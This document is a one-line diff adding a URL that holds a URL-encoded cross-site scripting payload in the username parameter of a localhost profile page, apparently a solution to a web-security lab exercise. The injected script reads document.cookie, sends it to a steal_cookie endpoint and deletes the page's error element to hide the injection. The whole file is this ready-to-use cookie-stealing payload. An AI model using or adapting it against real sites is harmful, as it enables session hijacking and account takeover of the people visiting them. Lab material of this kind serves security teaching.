@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=%3Cscript%3Evar%20xmlHttp%20=%20new%20XMLHttpRequest();const%20url%20=%20encodeURI(`http://localhost:3000/steal_cookie?cookie=${document.cookie}`);xmlHttp.open(%22GET%22,%20url,%20true%20);xmlHttp.send(null);document.getElementsByClassName(%27error%27)[0].remove()%3C/script%3E
